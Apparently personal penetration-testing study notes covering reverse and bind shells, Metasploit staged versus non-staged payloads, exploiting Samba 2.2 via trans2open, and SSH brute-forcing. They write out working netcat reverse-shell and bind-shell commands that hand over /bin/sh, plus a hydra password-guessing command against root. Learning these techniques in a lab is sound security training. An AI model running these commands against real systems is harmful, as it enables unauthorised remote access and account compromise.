- Shell types
	- Reverse shell (mostly use this!)
		- Victim connects to us
		- eg. our machine ip is 192.168.1.1, target ip is 192.168.1.2
		- Our machine
			- nc -lvp 4444 (listening on this port)
		- Target machine
			- TCP connection to 192.168.1.1:4444
			- nc 192.168.1.1 4444 -e /bin/sh
	- Bind shell
		- Opposite, we connect to victim
		- Our machine
			- nc 192.168.1.2 4444
		- Target machine
			- nc -lvp 4444 -e /bin/sh
	- Either way, victim always offers up the /bin/sh

- Payloads
	- Non-staged
		- Sends exploit shellcode all at once
		- Larger in size and won't always work
		- eg. windows/meterpreter_reverse_tcp
	- Staged
		- Sends payload ins tages
		-  Can be less stable
		- eg. windows/meterpreter/reverse_tcp
		- (take note of difference in the /)

Gaining shell with metasploit
- searchsploit samba 2.2
	- Found the call_trans2open exploit
- metasploit
	- msfconfig
	- search trans2open
	- use 1
	- options
	- set rhosts 172.16.232.129
		- r = receiver = victim
	- staged payload doesnt work, so changed to non staged payload and it works
	- options, set payload ....

Manual exploitation
- clone repo and run


Brute force attack
- hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.57.122:22 -t 4 -V
